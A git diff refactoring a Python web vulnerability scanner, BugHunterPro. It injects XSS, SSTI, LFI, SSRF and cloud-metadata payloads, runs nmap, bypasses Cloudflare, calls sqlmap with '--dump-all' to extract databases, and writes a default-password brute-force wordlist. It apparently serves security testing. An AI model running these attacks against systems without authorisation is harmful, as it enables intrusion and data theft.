+                            switching = true;
+                            dir = "asc";
+                            while (switching) {
+                                switching = false;
+                                rows = table.rows;
+                                for (i = 1; i < (rows.length - 1); i++) {
+                                    shouldSwitch = false;
+                                    x = rows[i].getElementsByTagName("TD")[n];
+                                    y = rows[i + 1].getElementsByTagName("TD")[n];
+                                    let xContent = isNaN(parseFloat(x.innerHTML)) ? x.innerHTML.toLowerCase() : parseFloat(x.innerHTML);
+                                    let yContent = isNaN(parseFloat(y.innerHTML)) ? y.innerHTML.toLowerCase() : parseFloat(y.innerHTML);
+                                    if (dir == "asc") {
+                                        if (xContent > yContent) {
+                                            shouldSwitch = true;
+                                            break;
+                                        }
+                                    } else if (dir == "desc") {
+                                        if (xContent < yContent) {
+                                            shouldSwitch = true;
+                                            break;
+                                        }
+                                    }
+                                }
+                                if (shouldSwitch) {
+                                    rows[i].parentNode.insertBefore(rows[i + 1], rows[i]);
                                     switching = true;
+                                    switchcount++;
+                                } else {
+                                    if (switchcount == 0 && dir == "asc") {
+                                        dir = "desc";
+                                        switching = true;
+                                    }
                                 }
                             }
                         }
-                    }
-                </script>
-            </body>
-            </html>
-        ''' % (
-            severity_counts.get('critical', 0),
-            severity_counts.get('high', 0),
-            severity_counts.get('medium', 0),
-            severity_counts.get('low', 0),
-            severity_counts.get('info', 0)
-        )
-        with open(html_path, "w") as f:
-            f.write(html)
-        self.log("info", f"Reports saved in directory: {run_report_dir}")
+                    </script>
+                </body>
+                </html>
+            ''' % (
+                severity_counts.get('critical', 0),
+                severity_counts.get('high', 0),
+                severity_counts.get('medium', 0),
+                severity_counts.get('low', 0),
+                severity_counts.get('info', 0)
+            )
+            with open(html_path, "w") as f:
+                f.write(html)
+            self.log("info", f"Reports saved in directory: {run_report_dir}")
 
-    def _make_request(self, url, method='GET', data=None, timeout=None, headers=None,
-                      files=None, allow_redirects=True, params=None, max_retries=3):
+    def _safe_request(
+            self,
+            method,
+            url,
+            params=None,
+            data=None,
+            headers=None,
+            files=None,
+            allow_redirects=True,
+            timeout=None,
+            max_retries=3):
+        self._throttle()
         safe_url = self._ensure_scheme(url)
         if not safe_url:
             self.log("error", "Invalid URL provided.")
             return None
 
         request_headers = {
-            "User-Agent": random.choice(self.config.get("SETTINGS", {}).get("USER_AGENTS", ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"]))
+            "User-Agent": random.choice(
+                self.config.get(
+                    "SETTINGS",
+                    {})
+                .get(
+                    "USER_AGENTS",
+                    ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"]))
         }
         if headers:
             request_headers.update(headers)
@@ -964,25 +1088,11 @@ class BugHunterPro:
                     params=params,
                     data=data,
                     headers=request_headers,
-                    timeout=timeout or 10,
+                    timeout=timeout or self.cf_timeout,
                     files=files,
                     allow_redirects=allow_redirects,
                     proxies=proxies)
                 return response
-            except requests.exceptions.ConnectionError as e:
-                self.log(
-                    "warn",
-                    f"Connection failed to {safe_url} (attempt {
-                        attempt + 1}/{max_retries}): {
-                        str(e).encode(
-                            'ascii',
-                            errors='replace').decode('ascii')}")
-                if attempt < max_retries - 1:
-                    time.sleep(2 ** attempt)
-                else:
-                    self.log(
-                        "error", f"Failed to connect to {safe_url} after {max_retries} attempts.")
-                    return None
             except requests.exceptions.Timeout as e:
                 self.log(
                     "warn",
@@ -995,7 +1105,23 @@ class BugHunterPro:
                     time.sleep(1)
                 else:
                     self.log(
-                        "error", f"Request to {safe_url} timed out after {max_retries} attempts.")
+                        "error",
+                        f"Request to {safe_url} timed out after {max_retries} attempts.")
+                    return None
+            except requests.exceptions.ConnectionError as e:
+                self.log(
+                    "warn",
+                    f"Connection failed to {safe_url} (attempt {
+                        attempt + 1}/{max_retries}): {
+                        str(e).encode(
+                            'ascii',
+                            errors='replace').decode('ascii')}")
+                if attempt < max_retries - 1:
+                    time.sleep(2 ** attempt)
+                else:
+                    self.log(
+                        "error",
+                        f"Failed to connect to {safe_url} after {max_retries} attempts.")
                     return None
             except requests.RequestException as e:
                 self.log(
@@ -1043,14 +1169,14 @@ class BugHunterPro:
                     "warn",
                     f"cloudscraper failed: {e}. Falling back to other methods.")
         if aggressive and PLAYWRIGHT_AVAILABLE:
+
             self.log(
                 "info",
                 "Attempting bypass with Playwright (aggressive mode)...")
             try:
                 with sync_playwright() as p:
                     browser = p.chromium.launch(
-                        headless=True, proxy={
-                            "server": self.proxy} if self.proxy else None)
+                        headless=True, proxy={"server": self.proxy} if self.proxy else None)
                     context = browser.new_context(user_agent=random.choice(
                         self.config.get("SETTINGS", {}).get("USER_AGENTS")))
                     page = context.new_page()
@@ -1067,7 +1193,7 @@ class BugHunterPro:
                     browser.close()
                     return True
             except Exception as e:
-                self.log("error", f"Playwright bypass failed: {e}")
+                self.log("error", f"Playwright is disabled, cannot perform aggressive bypass. Error: {e}")
         self.log("error", "All Cloudflare bypass methods failed.")
         return False
 
@@ -1088,30 +1214,22 @@ class BugHunterPro:
                 command = f"nmap {nmap_flags} -sV {self.host}"
                 try:
                     result = subprocess.run(
-                        command, shell=True, capture_output=True, text=True, timeout=180)
+                        command,
+                        shell=True,
+                        capture_output=True,
+                        text=True,
+                        timeout=180)
                     open_ports_found = False
                     for line in result.stdout.split('\n'):
                         if "/tcp" in line and "open" in line:
                             open_ports_found = True
                             parts = re.split(r'\s+', line)
-                            port_info = f"Port: {
-                                parts[0]}, State: {
-                                parts[1]}, Service: {
-                                ' '.join(
-                                    parts[
-                                        2:])}"
+                            port_info = f"Port: {parts[0]}, State: {parts[1]}, Service: {' '.join(parts[2:])}"
                             self.log(
                                 "warn",
                                 f"Nmap found open port: {port_info}",
                                 severity="medium")
-                            self.findings.append({
-                                "severity": "medium",
-                                "message": f"Open port detected by nmap on {self.host}",
-                                "evidence": {"details": port_info},
-                                "score": 30,
-                                "timestamp": _get_full_timestamp()
-                            })
-                            self.total_score += 30
+                            self._add_finding("medium", f"Open port detected by nmap on {self.host}", {"details": port_info}, self.host, module="Port Scan")
                     if not open_ports_found:
                         self.log(
                             "info", "Nmap scan completed, no open ports in top 100.")
@@ -1123,30 +1241,24 @@ class BugHunterPro:
             self.log("info", "Port scanning disabled via --no-ports")
         if deep_scan:
             self.log("info", "Performing deep scan for database backup files")
-            backup_extensions = ['.sql', '.bak', '.sql.gz', '.sql.bak']
+            backup_extensions = ['.sql', '.bak', '.sql.gz',
+                                 '.sql.bak']
             for path in tqdm(
-                    common_paths, desc="Checking backup files", file=sys.stdout):
+                    common_paths,
+                    desc="Checking backup files",
+                    file=sys.stdout):
                 if any(path.endswith(ext) for ext in backup_extensions):
                     test_url = urljoin(self.base_url, path)
-                    response = self._make_request(test_url)
+                    response = self._safe_request("GET", test_url)
                     if response and response.status_code == 200:
                         self.log(
                             "warn",
                             f"Database backup file exposed: {test_url}",
                             severity="critical")
-                        self.findings.append({
-                            "severity": "critical",
-                            "message": f"Database backup file exposed at {test_url}",
-                            "score": 90,
-                            "timestamp": _get_full_timestamp()
-                        })
-                        self.total_score += 90
+                        self._add_finding("critical", f"Database backup file exposed: {test_url}", {"details": "Backup file accessible"}, test_url, module="Information Disclosure")
         self.log(
             "info",
-            f"Database scan completed. Found {
-                len(
-                    [
-                        f for f in self.findings if 'database' in f['message'].lower()])} database-related findings")
+            f"Database scan completed. Found {len([f for f in self.findings if 'database' in f.get('message', '').lower()])} database-related findings")
 
     def check_oauth_misconfig(self):
         self.log_step("Checking for OAuth misconfiguration...")
@@ -1170,21 +1282,10 @@ class BugHunterPro:
                         parsed._replace(
                             query=urlencode(
                                 test_params, True)))
-                    response = self._make_request(test_url)
+                    response = self._safe_request("GET", test_url)
                     if response and response.status_code in [
                             200, 302] and "access_token" in response.text.lower():
-                        self.findings.append({
-                            "severity": "high",
-                            "message": f"Potential OAuth misconfiguration at {test_url}",
-                            "evidence": {"payload": payload},
-                            "score": 70,
-                            "timestamp": _get_full_timestamp()
-                        })
-                        self.total_score += 70
-                        self.log(
-                            "warn",
-                            f"Potential OAuth issue at {test_url}",
-                            severity="high")
+                        self._add_finding("high", f"Potential OAuth misconfiguration at {test_url}", {"payload": payload}, test_url, module="OAuth Misconfiguration", payload=payload)
         self.log(
             "info",
             f"OAuth check completed. Found {
@@ -1197,22 +1298,12 @@ class BugHunterPro:
         findings_count = len(self.findings)
         for url in tqdm(self.visited_urls,
                         desc="Checking session fixation", file=sys.stdout):
-            response = self._make_request(url)
+            response = self._safe_request("GET", url)
             if response and "Set-Cookie" in response.headers:
+
                 cookies = response.headers["Set-Cookie"].lower()
                 if "secure" not in cookies or "httponly" not in cookies or "samesite" not in cookies:
-                    self.findings.append({
-                        "severity": "medium",
-                        "message": f"Potential session fixation vulnerability at {url} (missing Secure/HttpOnly/SameSite attributes)",
-                        "evidence": {"cookies": cookies},
-                        "score": 40,
-                        "timestamp": _get_full_timestamp()
-                    })
-                    self.total_score += 40
-                    self.log(
-                        "warn",
-                        f"Session fixation risk at {url}",
-                        severity="medium")
+                    self._add_finding("medium", f"Potential session fixation vulnerability at {url} (missing Secure/HttpOnly/SameSite attributes)", {"cookies": cookies}, url, module="Session Management")
         self.log(
             "info",
             f"Session fixation check completed. Found {
@@ -1228,27 +1319,23 @@ class BugHunterPro:
             ['"]?([a-z0-9\-_=]{24,})['"]?
         """, re.VERBOSE)
         findings_count = len(self.findings)
-        for url in tqdm(self.visited_urls,
-                        desc="Checking API token leaks", file=sys.stdout):
-            response = self._make_request(url)
-            if response and ("javascript" in response.headers.get(
-                    "Content-Type", "") or "json" in response.headers.get("Content-Type", "")):
+        for url in tqdm(
+                self.visited_urls,
+                desc="Checking API token leaks",
+                file=sys.stdout):
+            response = self._safe_request("GET", url)
+            if response and (
+                "javascript" in response.headers.get(
+                    "Content-Type",
+                    "") or "json" in response.headers.get(
+                    "Content-Type",
+                    "")):
                 matches = key_regex.finditer(response.text)
                 for match in matches:
                     key_value = match.group(2)
                     if len(set(key_value)) < 5:
                         continue
-                    self.findings.append({
-                        "severity": "high",
-                        "message": f"Potential API token leak found at {url}",
-                        "evidence": {"matched_text": match.group(0), "key_name": match.group(1), "key_value": key_value},
-                        "score": 70,
-                        "timestamp": _get_full_timestamp()
-                    })
-                    self.total_score += 70
-                    self.log(
-                        "warn", f"Potential API token leak detected at {url}: {
-                            match.group(1)}", severity="high")
+                    self._add_finding("high", f"Potential API token leak found at {url}", {"matched_text": match.group(0), "key_name": match.group(1), "key_value": key_value}, url, module="API Key Leakage", payload=match.group(0))
         self.log(
             "info",
             f"API token leak check completed. Found {
@@ -1258,7 +1345,7 @@ class BugHunterPro:
 
     def check_security_headers(self):
         self.log_step("Checking for missing security headers...")
-        response = self._make_request(self.target)
+        response = self._safe_request("GET", self.target)
         if not response:
             self.log(
                 "warn",
@@ -1275,37 +1362,14 @@ class BugHunterPro:
             'cross-origin-opener-policy': 'medium',
             'cross-origin-embedder-policy': 'medium'
         }
-        for header, severity in headers_to_check.items():
+        for header, severity in headers_to_check.items(
+        ):
             if header not in headers:
-                self.findings.append({
-                    "severity": severity,
-                    "message": f"Security header '{header.title()}' is missing.",
-                    "evidence": {"recommendation": f"Implement the {header.title()} header to enhance security."},
-                    "score": SEVERITY_SCORES.get(severity, 0),
-                    "timestamp": _get_full_timestamp()
-                })
-                self.total_score += SEVERITY_SCORES.get(severity, 0)
-                self.log(
-                    "warn",
-                    f"Missing security header: {
-                        header.title()}",
-                    severity=severity)
+                self._add_finding(severity, f"Security header '{header.title()}' is missing.", {"recommendation": f"Implement the {header.title()} header to enhance security."}, self.target, module="Security Headers")
         if 'content-security-policy' in headers:
             csp = headers['content-security-policy']
             if "'unsafe-inline'" in csp or "'unsafe-eval'" in csp:
-                self.findings.append(
-                    {
-                        "severity": "medium",
-                        "message": "Content-Security-Policy (CSP) contains 'unsafe-inline' or 'unsafe-eval'.",
-                        "evidence": {
-                            "policy": csp},
-                        "score": 30,
-                        "timestamp": _get_full_timestamp()})
-                self.total_score += 30
-                self.log(
-                    "warn",
-                    "Weak CSP detected ('unsafe-inline' or 'unsafe-eval').",
-                    severity="medium")
+                self._add_finding("medium", "Content-Security-Policy (CSP) contains 'unsafe-inline' or 'unsafe-eval'.", {"policy": csp}, self.target, module="Security Headers")
         self.log("info", "Security headers check completed.")
 
     def _test_all_params(self, check_name, payloads,
@@ -1322,12 +1386,29 @@ class BugHunterPro:
         findings_count = len(self.findings)
 
         tasks = []
+        common_params = self._get_common_params_from_dorks()
+
         for url in self.visited_urls:
             parsed = urlparse(url)
             if not parsed.scheme or not parsed.netloc:
                 continue
+
+            # Skip static assets
+            if any(url.lower().endswith(ext) for ext in ['.css', '.js', '.png', '.jpg', '.jpeg', '.gif', '.svg', '.woff', '.woff2', '.ico']):
+                continue
+
             params = parse_qs(parsed.query)
-            for param in params:
+
+            # If no params, try adding common ones
+            if not params and common_params:
+                for common_param in common_params:
+                    # Create a new URL with the common parameter
+                    new_url_with_param = urlunparse(parsed._replace(query=f"{common_param}=1"))
+                    for payload in payloads:
+                        tasks.append((new_url_with_param, common_param, payload))
+
+            # Test existing parameters
+            for param in list(params.keys()):
                 for payload in payloads:
                     tasks.append((url, param, payload))
 
@@ -1389,7 +1470,9 @@ class BugHunterPro:
                     parsed._replace(
                         query=urlencode(
                             test_params, True)))
-                self._make_request(test_url, timeout=5)
+                self._safe_request("GET", test_url, timeout=5)
+                self.tested_payload_urls.add(test_url)
+
                 self.log(
                     "info",
                     f"Sent SSRF OAST payload to {test_url}. Check Interactsh for interactions with {unique_subdomain}.{oast_domain}")
@@ -1424,133 +1507,52 @@ class BugHunterPro:
                     test_params,
                     True)))
 
-        response = self._make_request(test_url)
+        response = self._safe_request("GET", test_url)
         if response and unique_marker in response.text:
             if re.search(
-                    fr"(<script>.*{re.escape(unique_marker)}.*</script>|on\w+\s*=\s*['\"].*{re.escape(unique_marker)}.*['\"])", response.text, re.IGNORECASE | re.DOTALL):
-                self.findings.append({
-                    "severity": "high", "message": f"Potential Reflected XSS at {test_url}",
-                    "evidence": {"payload": payload, "param": param}, "score": 70, "timestamp": _get_full_timestamp()
-                })
-                self.total_score += 70
-                self.log(
-                    "warn",
-                    f"Potential XSS at {test_url} (param: {param})",
-                    severity="high")
+                fr"(<script>.*{re.escape(unique_marker)}.*</script>|on\w+\s*=\s*['\"]?.*{re.escape(unique_marker)}.*['\"]?)",
+                    response.text, re.IGNORECASE | re.DOTALL):
+                self._add_finding("high", "Potential Reflected XSS", {"param": param, "proof": "Payload reflected and executed in response."}, test_url, module="XSS", payload=payload)
 
     def check_xss(self):
         xss_payloads = self.get_payloads("XSS")
-        self._test_all_params(
-            "XSS",
-            xss_payloads,
-            self._check_xss_vulnerability,
-            "Testing XSS")
+        self._test_all_params("XSS", xss_payloads, self._check_xss_vulnerability, "Testing XSS")
 
-    def check_sqli_error_based(self):
-        self.log_step("Checking for error-based SQL Injection...")
-        self.log(
-            "info", f"URLs to scan for SQLi Error-Based: {list(self.visited_urls)}")
-        sqli_payloads = self.get_payloads("SQLI_ERROR_BASED")
-        error_patterns = self.config.get("PAYLOADS", {}).get("SQLI_ERROR_PATTERNS", [
-            "you have an error in your sql syntax", "unclosed quotation mark", "warning: mysql_fetch",
-            "supplied argument is not a valid mysql", "pg_query()", "postgresql query failed",
-            "unclosed quotation mark after the character string", "microsoft ole db provider for odbc drivers",
-            "microsoft ole db provider for sql server",
-            "ora-00933", "ora-01756", "sqlite"
-        ])
-        findings_count = len(self.findings)
-        for url in tqdm(
-                self.visited_urls, desc="Testing SQLi error-based", file=sys.stdout, ascii=True):
-            parsed = urlparse(url)
-            if not parsed.scheme or not parsed.netloc:
-                self.log("warn", f"Skipping invalid URL: {url}")
-                continue
-            params = parse_qs(parsed.query)
-            baseline_response = self._make_request(url)
-            baseline_text = baseline_response.text.lower() if baseline_response else ""
-            for param in params:
-                for payload in sqli_payloads:
-                    test_params = params.copy()
-                    test_params[param] = payload
-                    test_url = urlunparse(
-                        parsed._replace(
-                            query=urlencode(
-                                test_params, True)))
-                    response = self._make_request(test_url)
-                    if response and any(err in response.text.lower() for err in error_patterns) and not any(
-                            err in baseline_text for err in error_patterns):
-                        self.findings.append({
-                            "severity": "critical",
-                            "message": f"Potential error-based SQL Injection at {test_url}",
-                            "evidence": {"payload": payload, "param": param, "error_trigger": [e for e in error_patterns if e in response.text.lower()][0]},
-                            "score": 90,
-                            "timestamp": _get_full_timestamp()
-                        })
-                        self.total_score += 90
-                        self.log(
-                            "warn",
-                            f"Potential SQLi at {test_url} (param: {param})",
-                            severity="critical")
-        self.log(
-            "info", f"Error-based SQLi check completed. Found {len(self.findings) - findings_count} new findings")
+    def _run_sqlmap_exploit(self, url):
+        if not shutil.which("sqlmap"):
+            return
 
-    def check_sqli_time_based(self):
-        self.log_step("Checking for time-based SQL Injection...")
-        self.log(
-            "info", f"URLs to scan for SQLi Time-Based: {list(self.visited_urls)}")
-        sqli_payloads = self.get_payloads("SQLI_TIME_BASED")
-        findings_count = len(self.findings)
-        if not sqli_payloads:
-            self.log("warn", "No SQLi time-based payloads found, using default")
-            sqli_payloads = self.get_payloads("SQLI_TIME_BASED")
-        for url in tqdm(
-                self.visited_urls, desc="Testing SQLi time-based", file=sys.stdout, ascii=True):
-            parsed = urlparse(url)
-            if not parsed.scheme or not parsed.netloc:
-                self.log("warn", f"Skipping invalid URL: {url}")
-                continue
-            params = parse_qs(parsed.query)
-            for param in params:
-                for payload in sqli_payloads:
-                    test_params = params.copy()
-                    test_params[param] = payload
-                    test_url_payload = urlunparse(
-                        parsed._replace(
-                            query=urlencode(
-                                test_params, True)))
-                    start_time_base = time.time()
-                    self._make_request(url, timeout=15)
-                    end_time_base = time.time()
-                    base_duration = end_time_base - start_time_base
-                    start_time_payload = time.time()
-                    try:
-                        self._make_request(test_url_payload, timeout=15)
-                    except requests.exceptions.Timeout:
-                        pass
-                    end_time_payload = time.time()
-                    payload_duration = end_time_payload - start_time_payload
-                    if payload_duration > (base_duration + 4.5):
-                        self.findings.append({
-                            "severity": "critical",
-                            "message": f"Potential time-based SQL Injection at {test_url_payload}",
-                            "evidence": {"payload": payload, "delay": f"{payload_duration:.2f}s", "baseline": f"{base_duration:.2f}s"},
-                            "score": 90,
-                            "timestamp": _get_full_timestamp()
-                        })
-                        self.total_score += 90
-                        self.log(
-                            "warn",
-                            f"Potential time-based SQLi at {test_url_payload} (param: {param})",
-                            severity="critical")
-        self.log(
-            "info", f"Time-based SQLi check completed. Found {len(self.findings) - findings_count} new findings")
+        cmd = ["sqlmap", "-u", url, "--batch", "--dump-all", "--timeout=10", "--retries=1"]
+        try:
+            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
+            if "dumped" in result.stdout:
+                self.log("success", f"SQLMap dump: {url}")
+        except BaseException:
+            self.log("warn", f"SQLMap skip (timeout): {url}")
+
+    def ensure_bruteforce_wordlist(self):
+        """Buat wordlist di folder payloads/ jika belum ada"""
+        wordlist_path = self.bruteforce_wordlist
+
+        if not os.path.exists(wordlist_path):
+            os.makedirs(os.path.dirname(wordlist_path), exist_ok=True)
+            default_passwords = [
+                "admin", "password", "123456", "admin123", "root", "toor",
+                "qwerty", "letmein", "welcome", "password123", "admin@123"
+            ]
+            with open(wordlist_path, 'w') as f:
+                for pwd in default_passwords:
+                    f.write(pwd + '\n')
+            self.log("info", f"Wordlist dibuat otomatis: {wordlist_path}")
+        else:
+            self.log("success", f"Wordlist ditemukan: {wordlist_path}")
 
     def check_ssti(self):
         self.log_step("Checking for SSTI vulnerabilities...")
         self.log("info", f"URLs to scan for SSTI: {list(self.visited_urls)}")
         ssti_payloads = self.get_payloads("SSTI")
         findings_count = len(self.findings)
-        for url in tqdm(self.visited_urls, desc="Testing SSTI",
+        for url in tqdm(self.visited_urls, desc="Testing SSTI", disable=self.silent,
                         file=sys.stdout, ascii=True):
             parsed = urlparse(url)
             if not parsed.scheme or not parsed.netloc:
@@ -1578,21 +1580,10 @@ class BugHunterPro:
                             parsed._replace(
                                 query=urlencode(
                                     test_params, True)))
-                        response = self._make_request(test_url)
+                        response = self._safe_request("GET", test_url)
+                        self.tested_payload_urls.add(test_url)
                         if response and expected_reflection in response.text:
-                            self.findings.append({
-                                "severity": "high",
-                                "message": f"Potential SSTI vulnerability at {test_url}",
-                                "evidence": {"payload": dyn_payload, "param": param, "reflection": expected_reflection},
-                                "score": 80,
-                                "timestamp": _get_full_timestamp()
-                            })
-                            self.total_score += 80
-                            self.log(
-                                "warn",
-                                f"Potential SSTI at {test_url} (param: {param})",
-                                severity="high")
-                            break
+                            self._add_finding("high", "Potential SSTI vulnerability", {"param": param, "proof": f"Reflection '{expected_reflection}' found in response."}, test_url, module="SSTI", payload=dyn_payload)
         self.log(
             "info",
             f"SSTI check completed. Found {
@@ -1617,7 +1608,7 @@ class BugHunterPro:
                 self.log("warn", f"Skipping invalid URL: {url}")
                 continue
             params = parse_qs(parsed.query)
-            baseline_response = self._make_request(url)
+            baseline_response = self._safe_request("GET", url)
             baseline_len = len(
                 baseline_response.text) if baseline_response else -1
             for param in params:
@@ -1628,7 +1619,8 @@ class BugHunterPro:
                         parsed._replace(
                             query=urlencode(
                                 test_params, True)))
-                    response = self._make_request(test_url)
+                    response = self._safe_request("GET", test_url)
+                    self.tested_payload_urls.add(test_url)
                     if not response:
                         continue
                     is_vulnerable = False
@@ -1648,21 +1640,7 @@ class BugHunterPro:
                             response_text) != baseline_len:
                         is_vulnerable = True
                     if is_vulnerable:
-                        self.findings.append(
-                            {
-                                "severity": "critical",
-                                "message": f"Potential LFI vulnerability at {test_url}",
-                                "evidence": {
-                                    "payload": payload,
-                                    "param": param},
-                                "score": 90,
-                                "timestamp": _get_full_timestamp()})
-                        self.total_score += 90
-                        self.log(
-                            "warn",
-                            f"Potential LFI at {test_url} (param: {param})",
-                            severity="critical")
-                        break
+                        self._add_finding("critical", f"Potential LFI vulnerability at {test_url}", {"payload": payload, "param": param}, test_url, module="LFI", payload=payload)
         self.log(
             "info", f"LFI check completed. Found {len(self.findings) - findings_count} new findings")
 
@@ -1692,7 +1670,8 @@ class BugHunterPro:
                     parsed._replace(
                         query=urlencode(
                             test_params, True)))
-                self._make_request(test_url, timeout=5)
+                self._safe_request("GET", test_url, timeout=5)
+
                 self.log(
                     "info",
                     f"Sent RFI OAST payload to {test_url}. Check your Interactsh client for interactions with {unique_subdomain}.{oast_domain}")
@@ -1718,14 +1697,15 @@ class BugHunterPro:
             "169.254.169.254": ["instance-id", "ami-id", "instance-type"],
             "metadata.google.internal": ["computeMetadata", "instance/"],
         }
-        for url in tqdm(self.visited_urls, desc="Testing SSRF",
+        for url in tqdm(self.visited_urls, desc="Testing SSRF", disable=self.silent,
                         file=sys.stdout, ascii=True):
             parsed = urlparse(url)
             if not parsed.scheme or not parsed.netloc:
                 self.log("warn", f"Skipping invalid URL: {url}")
                 continue
             params = parse_qs(parsed.query)
-            baseline_response = self._make_request(url)
+            baseline_response = self._safe_request("GET", url)
+
             baseline_text = baseline_response.text if baseline_response else ""
             for param in params:
                 for payload in ssrf_payloads:
@@ -1735,7 +1715,8 @@ class BugHunterPro:
                         parsed._replace(
                             query=urlencode(
                                 test_params, True)))
-                    response = self._make_request(test_url)
+                    response = self._safe_request("GET", test_url)
+                    self.tested_payload_urls.add(test_url)
                     if not response:
                         continue
                     is_vulnerable = False
@@ -1749,22 +1730,10 @@ class BugHunterPro:
                         if response.text != baseline_text and len(
                                 response.text) > 0:
                             is_vulnerable = True
+
                     if is_vulnerable:
-                        self.findings.append(
-                            {
-                                "severity": "high",
-                                "message": f"Potential SSRF vulnerability at {test_url}",
-                                "evidence": {
-                                    "payload": payload,
-                                    "param": param},
-                                "score": 80,
-                                "timestamp": _get_full_timestamp()})
-                        self.total_score += 80
-                        self.log(
-                            "warn",
-                            f"Potential SSRF at {test_url} (param: {param})",
-                            severity="high")
-                        break
+                        self._add_finding("high", f"Potential SSRF vulnerability at {test_url}",
+                                          {"payload": payload, "param": param}, test_url, module="SSRF", payload=payload)
         self.log(
             "info",
             f"SSRF check completed. Found {
@@ -1789,10 +1758,12 @@ class BugHunterPro:
             parsed = urlparse(url_to_test)
             if not parsed.scheme or not parsed.netloc:
                 self.log(
-                    "warn", f"Skipping invalid URL for SSRF check: {url_to_test}")
+                    "warn",
+                    f"Skipping invalid URL for SSRF check: {url_to_test}")
                 continue
 
             params = parse_qs(parsed.query)
+
             params_to_test = set(params.keys()) | set(common_ssrf_params)
             for param in list(params_to_test):
                 for host in hosts:
@@ -1811,23 +1782,13 @@ class BugHunterPro:
                                  doseq=True),
                                 parsed.fragment))
                         tasks.append((self._ensure_scheme(test_url), payload))
+                        self.tested_payload_urls.add(self._ensure_scheme(test_url))
 
         def check_task(task):
             test_url, payload = task
-            response = self._make_request(test_url, timeout=3)
+            response = self._safe_request("GET", test_url, timeout=3)
             if response and response.status_code == 200:
-                self.findings.append({
-                    "severity": "high",
-                    "message": f"Potential internal SSRF at {test_url}",
-                    "evidence": {"payload": payload},
-                    "score": 80,
-                    "timestamp": _get_full_timestamp()
-                })
-                self.total_score += 80
-                self.log(
-                    "warn",
-                    f"Potential internal SSRF at {test_url}",
-                    severity="high")
+                self._add_finding("high", "Potential internal resource access via SSRF", {"proof": "Successfully accessed a known internal-like path."}, test_url, module="SSRF", payload=payload)
 
         if not tasks:
             self.log("info", "No tasks generated for internal SSRF check.")
@@ -1862,6 +1823,7 @@ class BugHunterPro:
                     self.visited_urls)}")
         open_redirect = self.get_payloads("OPEN_REDIRECT")
         findings_count = len(self.findings)
+
         params = open_redirect.get("params", [])
         payloads = open_redirect.get("payloads", [])
         urls_to_scan = [self._ensure_scheme(url) for url in self.visited_urls]
@@ -1873,7 +1835,8 @@ class BugHunterPro:
                 self.log("warn", f"Skipping invalid URL: {url_to_test}")
                 continue
             query_params = parse_qs(parsed.query)
-            params_to_test = set(query_params.keys()) | set(params)
+            params_to_test = set(query_params.keys()) | set(
+                params)
             for param in list(params_to_test):
                 for payload in payloads:
                     test_params = query_params.copy()
@@ -1889,27 +1852,17 @@ class BugHunterPro:
                              doseq=True),
                             parsed.fragment))
                     tasks.append((self._ensure_scheme(test_url), payload))
+                    self.tested_payload_urls.add(self._ensure_scheme(test_url))
 
         def check_task(task):
             test_url, payload = task
-            response = self._make_request(
-                test_url, allow_redirects=False, timeout=5)
+            response = self._safe_request("GET",
+                                          test_url, allow_redirects=False, timeout=5)
             if not response:
                 return
             location_header = response.headers.get("Location", "")
             if response.is_redirect and "example.com" in location_header:
-                self.findings.append({
-                    "severity": "medium",
-                    "message": f"Potential Open Redirect at {test_url}",
-                    "evidence": {"payload": payload, "location": location_header},
-                    "score": 40,
-                    "timestamp": _get_full_timestamp()
-                })
-                self.total_score += 40
-                self.log(
-                    "warn",
-                    f"Potential Open Redirect at {test_url}",
-                    severity="medium")
+                self._add_finding("medium", "Potential Open Redirect", {"proof": f"Redirected to Location: {location_header}"}, test_url, module="Open Redirect", payload=payload)
 
         if not tasks:
             self.log("info", "No tasks generated for Open Redirect check.")
@@ -1945,16 +1898,23 @@ class BugHunterPro:
                 "warn",
                 "BeautifulSoup4 not installed (`pip install beautifulsoup4`). Skipping advanced CSRF check.")
             return
-        self.log("info", f"URLs to scan for CSRF: {list(self.visited_urls)}")
+        self.log(
+            "info",
+            f"URLs to scan for CSRF: {
+                list(
+                    self.visited_urls)}")
         findings_count = len(self.findings)
         urls_to_scan = [self._ensure_scheme(url) for url in self.visited_urls]
         for url in tqdm(
-                urls_to_scan, desc="Checking forms for CSRF tokens", file=sys.stdout, ascii=True):
+                urls_to_scan,
+                desc="Checking forms for CSRF tokens",
+                file=sys.stdout,
+                ascii=True):
             parsed = urlparse(url)
             if not parsed.scheme or not parsed.netloc:
                 self.log("warn", f"Skipping invalid URL: {url}")
                 continue
-            response = self._make_request(url)
+            response = self._safe_request("GET", url)
             if response and 'text/html' in response.headers.get(
                     'Content-Type', ''):
                 soup = BeautifulSoup(response.text, 'html.parser')
@@ -1965,8 +1925,11 @@ class BugHunterPro:
                     for hidden_input in form.find_all(
                             'input', {'type': 'hidden'}):
                         name = hidden_input.get('name', '').lower()
-                        if any(keyword in name for keyword in [
-                               'csrf', 'token', 'nonce']):
+                        if any(
+                            keyword in name for keyword in [
+                                'csrf',
+                                'token',
+                                'nonce']):
                             token_input = hidden_input
                             break
                     if not token_input:
@@ -1974,17 +1937,7 @@ class BugHunterPro:
                             "warn",
                             f"Form without CSRF token found at {url}",
                             severity="medium")
-                        self.findings.append(
-                            {
-                                "severity": "medium",
-                                "message": f"Form without CSRF token found at {url}",
-                                "evidence": {
-                                    "form_action": form.get(
-                                        'action',
-                                        'N/A')},
-                                "score": 40,
-                                "timestamp": _get_full_timestamp()})
-                        self.total_score += 40
+                        self._add_finding("medium", f"Form without CSRF token found at {url}", {"form_action": form.get('action', 'N/A')}, url, module="CSRF")
                     else:
                         form_data = {
                             inp.get('name'): inp.get(
@@ -1993,25 +1946,17 @@ class BugHunterPro:
                         tampered_data = form_data.copy()
                         tampered_data[token_input.get(
                             'name')] = "tampered_token_value"
-                        action_url = urljoin(url, form.get('action', ''))
+                        action_url = urljoin(url, form.get(
+                            'action', ''))
                         action_url = self._ensure_scheme(action_url)
-                        tampered_response = self._make_request(
-                            action_url, method='POST', data=tampered_data)
+                        tampered_response = self._safe_request("POST",
+                                                               action_url, data=tampered_data)
                         if tampered_response and tampered_response.status_code < 400:
                             self.log(
                                 "warn",
                                 f"CSRF token may not be validated at {action_url}",
                                 severity="high")
-                            self.findings.append(
-                                {
-                                    "severity": "high",
